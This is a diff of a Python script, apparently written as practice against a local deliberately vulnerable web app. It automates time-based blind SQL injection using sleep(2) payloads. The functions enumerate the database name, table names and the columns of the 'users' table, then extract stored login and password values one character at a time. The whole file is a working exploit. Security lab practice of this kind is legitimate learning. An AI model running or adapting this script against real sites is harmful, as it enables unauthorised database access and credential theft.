@@ -1,14 +1,12 @@
 import requests
 import time
+import loginUtil
 
-BASE_URL = "http://localhost:9999/sqli_15.php?title=Iron Man' and "
+SQL_BASE_URL = "http://localhost:9999/sqli_15.php?title=Iron Man' and "
 
 LOGIN_URL = "http://localhost:9999/login.php"
 
-BASE_LOGIN_URL = "http://localhost:9999/"
-
 body = {"login": "bee","password":"bug","security_leve":0,"form":"submit"}
-
 
 headers={
             "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
@@ -21,23 +19,10 @@ headers={
 
 ACTION = " and sleep(2) -- &action=search"
 
-def get_request_cookie():
-    #创建session
-    session = requests.Session()
-    session.post(LOGIN_URL,body==map)
-    request_cookies = session.cookies.get_dict()
-    print(request_cookies)
-    return request_cookies
-
-def login():
-    resp = requests.post(LOGIN_URL,data=body,headers=headers,cookies=get_request_cookie(),allow_redirects=False)
-    cookies = resp.cookies
-    return cookies
-
 def get_data_base_name_length(cookies) -> int:
     count = 0
     for i in range(100):
-        url = BASE_URL + "length(database()) = {}".format(i) + ACTION
+        url = SQL_BASE_URL + "length(database()) = {}".format(i) + ACTION
         start_time = time.time()
         requests.get(url, headers=headers,cookies=cookies)
         if time.time() - start_time > 1:
@@ -50,7 +35,7 @@ def get_date_base_name(cookies,count):
     temp = ""
     for i in range(count + 1):
         for j in range(33, 127):
-            url = BASE_URL + "ascii(substr(database(),{},1)) = {}".format(i, j) + ACTION
+            url = SQL_BASE_URL + "ascii(substr(database(),{},1)) = {}".format(i, j) + ACTION
             start_time = time.time()
             requests.get(url, headers=headers, cookies=cookies)
             if time.time() - start_time > 1:
@@ -61,7 +46,7 @@ def get_date_base_name(cookies,count):
 def get_table_count(cookies) -> int:
     count = 0
     for i in range(100):
-        url = BASE_URL + "(select count(table_name) from information_schema.TABLES where TABLE_SCHEMA = database())={}".format(i) + ACTION
+        url = SQL_BASE_URL + "(select count(table_name) from information_schema.TABLES where TABLE_SCHEMA = database())={}".format(i) + ACTION
         start_time = time.time()
         requests.get(url, headers=headers, cookies = cookies)
         if time.time() - start_time > 1:
@@ -69,22 +54,91 @@ def get_table_count(cookies) -> int:
             count = i
     return count
 
-def get_table_name_length_each_table(cookies,count) -> int:
-    for i in range(count+1):
-        for j in range(100):
-            url = BASE_URL + "(select count(table_name) from information_schema.TABLES where TABLE_SCHEMA = database())={}".format(i) + ACTION
+def get_table_name_length_each_table(cookies,tableIndex) -> int:
+    # 遍历每个表的名字 设置最长20个字符
+    for tIndex in range(tableIndex):
+        for tableLength in range(20):
+            url = SQL_BASE_URL + "(select length(table_name) from information_schema.tables where table_schema = database() limit {},1)={}".format(tIndex,tableLength) + ACTION
             start_time = time.time()
-            requests.get(url, headers=headers, cookies= cookies)
+            requests.get(url, headers=headers, cookies=cookies)
             if time.time() - start_time > 1:
-                print("一共有{}张表".format(i))
-                count = i
+                print("*"*10)
+                print("表字段长度为:",tableLength)
+                get_table_name_each_table(cookies,tIndex,tableLength)
+                print("*"*10)
+
+def get_table_name_each_table(cookies,tIndex,tableLength):
+    # 获取每个表名字
+    table_name = []
+    for i in range(tableLength+1):
+        for j in range(33, 127):
+            # select table_name from information_schema.tables where table_schema = database();
+            url = SQL_BASE_URL + "(select  ascii(substr(table_name,{},1)) from information_schema.tables where table_schema = database() limit {},1)={}".format(
+               i, tIndex, j) + ACTION
+            start_time = time.time()
+            requests.get(url, headers=headers, cookies=cookies)
+            if time.time() - start_time > 1:
+                table_name.append(chr(j))
+    print(''.join(table_name))
+def get_column_count(cookies) -> int:
+    count = 0
+    for i in range(100):
+        url = SQL_BASE_URL + "(select count(column_name) from information_schema.columns where table_name = 'users') = {} ".format(i) + ACTION
+        start_time = time.time()
+        requests.get(url, headers=headers, cookies = cookies)
+        if time.time() - start_time > 1:
+            print("一共个{}字段".format(i))
+            count = i
+    return count
+def get_user_table_column_length(cookies,columnCount) -> int:
+    # 遍历每个表的名字 设置最长20个字符
+    for cIndex in range(columnCount):
+        for tableLength in range(20):
+            url = SQL_BASE_URL + "(select length(column_name) from information_schema.columns where table_name = 'users' limit {},1)={}".format(
+                cIndex, tableLength) + ACTION
+            start_time = time.time()
+            requests.get(url, headers=headers, cookies=cookies)
+            if time.time() - start_time > 1:
+                print("*" * 10)
+                print("表字段长度为:", tableLength)
+                get_table_column_name_each(cookies, cIndex, tableLength)
+                print("*" * 10)
+
+def get_table_column_name_each(cookies, cIndex, cLength):
+    # 获取每个表名字
+    table_name = []
+    for i in range(cLength + 1):
+        for j in range(33, 127):
+            # select table_name from information_schema.tables where table_schema = database();
+            url = SQL_BASE_URL + "(select  ascii(substr(column_name,{},1)) from information_schema.columns where table_name = 'users' limit {},1)={}".format(
+                i, cIndex, j) + ACTION
+            start_time = time.time()
+            requests.get(url, headers=headers, cookies=cookies)
+            if time.time() - start_time > 1:
+                table_name.append(chr(j))
+    print(''.join(table_name))
+
+def get_use_name_password(cookies):
+    userNameAndPassword=[]
+    for i in range(100):
+        for j in range(33,127):
+            # select table_name from information_schema.tables where table_schema = database();
+            url = SQL_BASE_URL + "(select ascii(substr(concat(login,'@',password),{},1)) from users limit 0,1)={}".format(i,j) + ACTION
+            start_time = time.time()
+            requests.get(url, headers=headers, cookies=cookies)
+            if time.time() - start_time > 1:
+                userNameAndPassword.append(chr(j))
+    print(''.join(userNameAndPassword))
 
 if __name__ == '__main__':
     #get_table_count()
     # 模拟login 获取响应 cookies
-    cookies = login()
+    cookies = loginUtil.login(LOGIN_URL, body, headers)
     # 通过cookies做后续测试
-    # 获取总表个数
-    count = get_table_count(cookies)
+    # 获取database name
+    #get_date_base_name(cookies, get_data_base_name_length(cookies))
     # 获取各表名
-    get_table_name_length_each_table(cookies,count)
+    # get_table_name_length_each_table(cookies,get_table_count(cookies))
+    # 获取users 表字段
+    # get_user_table_column_length(cookies,get_column_count(cookies));
+    get_use_name_password(cookies);
